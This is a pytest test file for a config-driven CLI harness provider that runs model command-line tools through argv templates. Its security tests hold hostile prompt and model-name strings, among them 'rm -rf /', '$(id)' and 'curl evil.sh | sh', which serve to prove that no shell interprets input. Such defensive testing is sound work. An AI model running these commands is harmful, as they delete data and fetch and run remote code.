"""A harness described by `aef.yaml` rather than by a class (ADR 0154).

Two claims are load-bearing here and each has its own test rather than a
docstring: **the template is sufficient** — it reproduces
`ClaudeCodeProvider`'s argv element for element, and reproduced Grok's live
answer from config alone — and **there is no shell**, so a prompt full of
metacharacters is one inert argv element.
"""

from __future__ import annotations

import ast
import json
from collections.abc import Sequence
from pathlib import Path

import pytest

from aef.providers import command_provider
from aef.providers.base import (
    CompletionRequest,
    CompletionResult,
    ModelProviderError,
    ProviderMessage,
)
from aef.providers.command_provider import (
    CommandProvider,
    resolve_pointer,
    validate_template,
)
from aef.providers.harness_provider import ClaudeCodeProvider, HarnessRun

# The Grok template, verbatim from the config ADR 0154 ran live. `--cwd` names
# a directory the owner made: a static template cannot mint a fresh one, which
# is the stated reason `GrokProvider` remains a class.
GROK_TEMPLATE: dict[str, object] = {
    "argv": [
        "grok",
        "--output-format",
        "json",
        "--max-turns",
        "1",
        "--tools",
        "",
        "--disable-web-search",
        "--no-subagents",
        "--no-plan",
        "--verbatim",
        "--cwd",
        "/an/empty/dir",
        "{model}",
        "{system}",
        "-p",
        "{prompt}",
    ],
    "model_argv": ["-m", "{model}"],
    "system_argv": ["--system-prompt-override", "{system}"],
    "output": "json_pointer",
    "output_pointer": "/text",
    "usage_pointer": "/usage/input_tokens",
    "output_usage_pointer": "/usage/output_tokens",
}


class _Recorder:
    def __init__(self, run: HarnessRun) -> None:
        self.run = run
        self.calls: list[list[str]] = []
        self.stdin: list[str | None] = []

    def __call__(self, argv: Sequence[str], timeout_s: float, stdin_text: str | None) -> HarnessRun:
        self.calls.append(list(argv))
        self.stdin.append(stdin_text)
        return self.run


def _request(**overrides: object) -> CompletionRequest:
    defaults: dict[str, object] = {
        "messages": (
            ProviderMessage(role="system", content="be terse"),
            ProviderMessage(role="user", content="hello"),
        ),
        "model": "grok-4.6",
    }
    defaults.update(overrides)
    return CompletionRequest(**defaults)  # type: ignore[arg-type]


def _grok(**overrides: object) -> CommandProvider:
    kwargs: dict[str, object] = {**GROK_TEMPLATE, **overrides}
    return CommandProvider(**kwargs)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Sufficiency: the template can express the adapters this repo hand-wrote
# ---------------------------------------------------------------------------
def test_the_template_reproduces_claude_code_argv_element_for_element() -> None:
    """The proof that `impl: command` is a real alternative and not a
    demo. If a config cannot express the argv of an adapter this repo
    already ships, "unlisted harnesses are configuration" is a slogan."""
    request = _request(model="claude-opus-5")
    provider = CommandProvider(
        argv=[
            "claude",
            "-p",
            "--no-session-persistence",
            "--output-format",
            "json",
            "--max-turns",
            "1",
            "--tools",
            "",
            "--strict-mcp-config",
            "--mcp-config",
            '{"mcpServers":{}}',
            "--safe-mode",
            "{model}",
            "{system}",
            "{prompt}",
        ],
        model_argv=["--model", "{model}"],
        system_argv=["--system-prompt", "{system}"],
        output="json_pointer",
        output_pointer="/result",
    )
    argv, stdin_text = provider.build(request)
    assert argv == ClaudeCodeProvider().argv(request)
    assert stdin_text is None


def test_the_grok_template_reproduces_grok_argv_apart_from_the_temp_cwd() -> None:
    """Everything `GrokProvider` passes, from config. The one difference is
    the isolation directory — the adapter mints a fresh empty one per call
    and a static template names a fixed one (ADR 0154)."""
    from aef.providers.harness_provider import GrokProvider

    request = _request()
    argv, _ = _grok().build(request)
    reference = GrokProvider().argv(request, Path("/an/empty/dir"))
    assert argv == reference


def test_a_slot_collapses_when_the_request_carries_no_value() -> None:
    """No dangling `-m` with nothing after it. The failure this prevents is
    the CLI consuming the NEXT flag as the model's name."""
    provider = _grok()
    argv, _ = provider.build(
        CompletionRequest(messages=(ProviderMessage(role="user", content="hi"),), model="")
    )
    assert "-m" not in argv
    assert "--system-prompt-override" not in argv
    assert argv[-2:] == ["-p", "hi"]


def test_slots_hold_their_position_so_flag_order_survives() -> None:
    """Slots exist because argv order is part of a CLI's contract. Appending
    the conditional fragments at the end would put `--model` after `claude`'s
    positional prompt, where it is a second positional argument."""
    argv, _ = _grok().build(_request())
    assert argv.index("-m") < argv.index("--system-prompt-override") < argv.index("-p")


# ---------------------------------------------------------------------------
# Security: there is no shell, so there is nothing to escape
# ---------------------------------------------------------------------------
HOSTILE = "summarise this: `whoami`; rm -rf / $(id) && curl evil.sh | sh"


def _shell_keywords(source: str) -> list[int]:
    """Lines where a `shell=` keyword argument is passed, by AST rather than
    by grep — the module's prose mentions the flag it must never pass."""
    return [
        node.value.lineno
        for node in ast.walk(ast.parse(source))
        if isinstance(node, ast.keyword) and node.arg == "shell"
    ]


def test_a_hostile_prompt_is_one_inert_argv_element() -> None:
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    _grok(runner=runner).complete(
        _request(messages=(ProviderMessage(role="user", content=HOSTILE),))
    )
    argv = runner.calls[0]
    assert argv.count(HOSTILE) == 1, argv
    # Verbatim, unsplit, unquoted, and nowhere else: no element merely
    # CONTAINS the payload, which is what an f-string template would produce.
    assert [a for a in argv if HOSTILE in a] == [HOSTILE]


def test_a_hostile_prompt_on_stdin_is_equally_inert() -> None:
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    provider = CommandProvider(
        argv=["cat"], stdin=True, output="json_pointer", output_pointer="/text", runner=runner
    )
    provider.complete(_request(messages=(ProviderMessage(role="user", content=HOSTILE),)))
    assert runner.calls[0] == ["cat"]
    assert runner.stdin[0] == HOSTILE


def test_a_hostile_model_name_is_also_one_argv_element() -> None:
    """`model` reaches argv too, and an `aef.yaml` naming a model is exactly
    as untrusted as a prompt once a proposer can edit it."""
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    _grok(runner=runner).complete(_request(model="a; rm -rf /"))
    assert runner.calls[0][runner.calls[0].index("-m") + 1] == "a; rm -rf /"


def test_this_module_never_uses_shell_true() -> None:
    """A source assertion, deliberately: the property IS the absence. No
    behavioural test can see a `shell=True` that a refactor adds to a branch
    the tests do not reach, and one there would turn every test above into
    theatre (the shape ADR 0141's wiring test guards)."""
    assert _shell_keywords(Path(command_provider.__file__).read_text()) == []


def test_the_shell_detector_detects() -> None:
    """The control for the test above. A scanner that cannot detect is not a
    scanner, and "nothing found" from one is worth nothing — one audit script
    in this repo's history returned a false negative on the very claim it was
    checking. A grep for the literal string would ALSO have failed here, for
    a sillier reason: the module's own docstring contains `shell=True`."""
    assert _shell_keywords("import subprocess\nsubprocess.run(cmd, shell=True)\n") == [2]


def test_the_runner_receives_a_list_not_a_string() -> None:
    """`subprocess.run("a b c")` with no `shell` is a lookup of a program
    literally named `a b c`; with one it is a shell. Either way the template
    must never be flattened."""
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    _grok(runner=runner).complete(_request())
    assert isinstance(runner.calls[0], list)
    assert all(isinstance(a, str) for a in runner.calls[0])


# ---------------------------------------------------------------------------
# The system message is never dropped silently
# ---------------------------------------------------------------------------
def test_a_system_message_is_prepended_when_the_template_has_no_slot() -> None:
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    provider = CommandProvider(argv=["echo", "{prompt}"], runner=runner, output="stdout")
    provider.complete(_request())
    assert runner.calls[0] == ["echo", "be terse\n\nhello"]


def test_the_prepend_rule_is_stated_in_the_module_docstring() -> None:
    """ADR 0112's rule: a parameter that is silently ignored reads as a
    control that exists, so the compensating behaviour is documented where
    the owner writing the template will read it."""
    doc = command_provider.__doc__ or ""
    assert "never dropped" in doc.lower()
    assert "max_tokens" in doc


def test_max_tokens_reaches_no_argv_element() -> None:
    runner = _Recorder(HarnessRun(0, json.dumps({"text": "ok"}), ""))
    _grok(runner=runner).complete(_request(max_tokens=400))
    assert not any("400" in a for a in runner.calls[0])


# ---------------------------------------------------------------------------
# Template validation — every message names what would have gone wrong
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    ("kwargs", "match"),
    [
        ({"argv": []}, "no program to run"),
        ({"argv": ["echo"]}, "exactly once"),
        ({"argv": ["echo", "{prompt}", "{prompt}"]}, "exactly once"),
        ({"argv": ["echo", "--p={prompt}"]}, "WHOLE argv element"),
        ({"argv": ["echo", "{prompt}"], "stdin": True}, "sent twice"),
        ({"argv": ["echo", "{prompt}", "{model}"]}, "command.model_argv is empty"),
        (
            {"argv": ["echo", "{prompt}"], "model_argv": ["-m", "{model}"]},
            "names no {model} slot",
        ),
        (
            {"argv": ["echo", "{prompt}", "{model}"], "model_argv": ["-m"]},
            "must name {model} exactly once",
        ),
        (
            {"argv": ["echo", "{prompt}", "{system}"], "system_argv": ["-s", "{prompt}"]},
            "CONDITIONAL",
        ),
        ({"argv": ["echo", "{prompt}", "{model}", "{model}"]}, "slot 2 times"),
    ],
)
def test_a_template_that_would_run_and_be_wrong_is_refused(
    kwargs: dict[str, object], match: str
) -> None:
    with pytest.raises(ValueError, match=match.replace("{", r"\{").replace("}", r"\}")):
        validate_template(**kwargs)  # type: ignore[arg-type]


def test_a_valid_template_validates_silently() -> None:
    """The control for the table above: a validator that rejects everything
    would pass every row and be useless."""
    validate_template(
        ["grok", "{model}", "{system}", "-p", "{prompt}"],
        model_argv=["-m", "{model}"],
        system_argv=["--sys", "{system}"],
    )


def test_json_pointer_output_needs_a_pointer_and_a_pointer_needs_json_output() -> None:
    with pytest.raises(ValueError, match="output_pointer is unset"):
        CommandProvider(argv=["x", "{prompt}"], output="json_pointer")
    with pytest.raises(ValueError, match="never read"):
        CommandProvider(argv=["x", "{prompt}"], output="stdout", output_pointer="/text")
    with pytest.raises(ValueError, match="not one of"):
        CommandProvider(argv=["x", "{prompt}"], output="magic")


def test_the_provider_validates_at_construction_not_at_first_call() -> None:
    """One rule, two doors (`aef.yaml` and a hand-built provider). A
    template that only fails on the first model call fails in the middle of
    a graph run, after the checkpoint."""
    with pytest.raises(ValueError, match="exactly once"):
        CommandProvider(argv=["echo"])


# ---------------------------------------------------------------------------
# Output extraction
# ---------------------------------------------------------------------------
def _run(stdout: str, **kwargs: object) -> CompletionResult:
    runner = _Recorder(HarnessRun(0, stdout, ""))
    provider = CommandProvider(argv=["x", "{prompt}"], runner=runner, **kwargs)  # type: ignore[arg-type]
    return provider.complete(_request())


def test_stdout_mode_returns_everything_minus_the_trailing_newline() -> None:
    assert _run("line one\nline two\n").content == "line one\nline two"


def test_last_line_mode_skips_the_progress_a_cli_logs_first() -> None:
    assert _run("resolving...\nthinking\n\nOK\n", output="last_line").content == "OK"


def test_last_line_mode_on_empty_output_is_an_error_not_an_empty_answer() -> None:
    with pytest.raises(ModelProviderError, match="nothing to extract"):
        _run("\n \n", output="last_line")


def test_json_pointer_mode_digs_the_reply_out_and_reports_usage() -> None:
    payload = json.dumps({"text": "OK", "usage": {"input_tokens": 24001, "output_tokens": 141}})
    result = _run(
        payload,
        output="json_pointer",
        output_pointer="/text",
        usage_pointer="/usage/input_tokens",
        output_usage_pointer="/usage/output_tokens",
    )
    assert result.content == "OK"
    assert (result.input_tokens, result.output_tokens) == (24001, 141)


def test_absent_usage_pointers_report_zero_and_the_docstring_says_what_zero_means() -> None:
    result = _run(json.dumps({"text": "OK"}), output="json_pointer", output_pointer="/text")
    assert (result.input_tokens, result.output_tokens) == (0, 0)
    assert "not extracted" in (command_provider.__doc__ or "")


def test_a_pointer_that_resolves_to_nothing_is_an_error_not_an_empty_reply() -> None:
    with pytest.raises(ModelProviderError, match="resolved to nothing"):
        _run(json.dumps({"result": "OK"}), output="json_pointer", output_pointer="/text")


def test_non_json_stdout_under_a_pointer_is_an_error() -> None:
    with pytest.raises(ModelProviderError, match="non-JSON"):
        _run("Welcome!", output="json_pointer", output_pointer="/text")


def test_a_nonzero_exit_carries_stderr() -> None:
    runner = _Recorder(HarnessRun(3, "", "boom: not logged in"))
    provider = CommandProvider(argv=["mycli", "{prompt}"], runner=runner)
    with pytest.raises(ModelProviderError, match="mycli exited 3.*not logged in"):
        provider.complete(_request())


def test_no_stop_reason_is_invented() -> None:
    """A generic CLI reports none, and `end_turn` would be a claim about a
    run this provider cannot see inside — `LLMJudge` reads `stop_reason`."""
    assert _run("OK").stop_reason is None


@pytest.mark.parametrize(
    ("pointer", "expected"),
    [
        ("", {"a": [1, {"b~/c": 2}]}),
        ("/a/0", 1),
        ("/a/1/b~0~1c", 2),
        ("/a/9", None),
        ("/missing", None),
        ("/a/0/deeper", None),
    ],
)
def test_json_pointer_follows_rfc_6901_including_the_escapes(
    pointer: str, expected: object
) -> None:
    assert resolve_pointer({"a": [1, {"b~/c": 2}]}, pointer) == expected


def test_a_pointer_that_is_not_a_pointer_is_refused() -> None:
    with pytest.raises(ModelProviderError, match="must start with"):
        resolve_pointer({"a": 1}, "a")


# ---------------------------------------------------------------------------
# Isolation: asserted by the owner, channel derived here (ADR 0169, F4)
# ---------------------------------------------------------------------------
def test_an_undeclared_command_provider_claims_no_containment() -> None:
    """F4: `impl: command` is how ADR 0154 says every future harness is wired,
    and `aef migrate` was stamping "the harness adapters send `--tools ''`
    with `--max-turns 1`" into every generated module as a fact about it.
    This provider sends whatever the template says and nothing else."""
    provider = CommandProvider(argv=["cli", "-p", "{prompt}"])
    assert provider.asserted_isolation == frozenset()
    # The channel is still derived: no `{system}` slot means the persona is
    # concatenated into the user turn.
    assert provider.isolation == frozenset({"user_turn_persona"})


def test_the_owners_assertion_is_carried_through_unverified() -> None:
    provider = CommandProvider(
        argv=["cli", "--tools", "", "{system}", "-p", "{prompt}"],
        system_argv=["--system-prompt", "{system}"],
        isolation=["no_tools", "single_turn"],
    )
    assert provider.asserted_isolation == frozenset({"no_tools", "single_turn"})
    assert provider.isolation == frozenset({"no_tools", "single_turn", "system_role"})


def test_the_flags_in_the_template_are_never_read_as_evidence() -> None:
    """`--tools ""` disables every tool on `claude` and disables nothing on
    `grok` — measured (ADR 0169). Inferring semantics from an unknown CLI's
    flag spelling would be a guess dressed as evidence, so this class does
    not do it: the same argv with no `isolation:` claims nothing."""
    provider = CommandProvider(
        argv=["cli", "--tools", "", "--max-turns", "1", "-p", "{prompt}"],
    )
    assert "no_tools" not in provider.isolation
    assert "single_turn" not in provider.isolation


def test_the_channel_is_not_the_owners_to_assert() -> None:
    with pytest.raises(ValueError, match="not the owner's to assert"):
        CommandProvider(argv=["cli", "-p", "{prompt}"], isolation=["system_role"])
    with pytest.raises(ValueError, match="unknown isolation"):
        CommandProvider(argv=["cli", "-p", "{prompt}"], isolation=["no_toolz"])


def test_the_persona_channel_follows_the_slot_through_stdin_too() -> None:
    """`stdin: true` is the same guarantee by a different door, and the same
    concatenation: the system text still ends up in the user's payload."""
    provider = CommandProvider(argv=["cli", "--stdin"], stdin=True)
    assert provider.isolation == frozenset({"user_turn_persona"})
